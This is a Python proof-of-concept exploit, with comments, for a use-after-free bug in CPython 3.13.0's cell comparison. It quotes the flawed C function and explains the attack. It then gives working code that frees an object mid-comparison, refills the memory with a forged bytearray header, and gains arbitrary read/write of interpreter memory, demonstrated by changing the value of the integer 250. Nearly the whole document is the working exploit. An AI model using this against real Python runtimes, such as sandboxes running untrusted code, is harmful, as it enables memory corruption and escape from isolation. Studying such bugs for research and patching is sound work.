"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: UAF on controlled object to create evil object
# Tested to work on 3.13.0 (Accidentally(?) patched in 3.13.1)

# Here is the vulnerable code as of 3.13.0
# https://github.com/python/cpython/blob/v3.13.0/Objects/cellobject.c#L82-L100
"""
static PyObject *
cell_richcompare(PyObject *a, PyObject *b, int op)
{
    /* neither argument should be NULL, unless something's gone wrong */
    assert(a != NULL && b != NULL);

    /* both arguments should be instances of PyCellObject */
    if (!PyCell_Check(a) || !PyCell_Check(b)) {
        Py_RETURN_NOTIMPLEMENTED;
    }

    /* compare cells by contents; empty cells come before anything else */
    a = ((PyCellObject *)a)->ob_ref;
    b = ((PyCellObject *)b)->ob_ref;
    if (a != NULL && b != NULL)
        return PyObject_RichCompare(a, b, op); // <--- a and b are controlled objects and their refcounts
                                               //      don't get increased before the comparison

    Py_RETURN_RICHCOMPARE(b == NULL, a == NULL, op);
}
"""

# The plan of attack for this is to create 2 cells where the first cell has an object with a custom `__eq__`
# function that will nuke itself. After nuking itself, we will reclaim the memory with the bytes for a fake
# bytearray object, and then we return NotImplemented. After returning NotImplemented, it will be passed to `catch.__eq__`
# where the `other` arg will be the freed object (which is now our fake bytearray object)

def cell_gen(x=0):
    def _():
        nonlocal x
        return x
    return _.__closure__[0]

cell1 = cell_gen()
cell2 = cell_gen()

class evil(bytes):
    def __eq__(self, other):
        global _ref
        # nuking itself to free all the memory
        del cell1.cell_contents, self
        # reclaim the memory with the fake bytearray
        _ref = fake_obj.ljust(SIZE)
        # return NotImplemented to call catch.__eq__ with `other` as the freed object
        return NotImplemented

class catch:
    def __eq__(self, other):
        global mem
        mem = other

p64 = lambda num: num.to_bytes(8, 'little')
fake_obj = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) +
    p64(0)
)

SIZE = 0x100

cell1.cell_contents = evil(SIZE - 0x18)
cell2.cell_contents = catch()

mem = None
cell1 == cell2 # <-- triggers bug
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100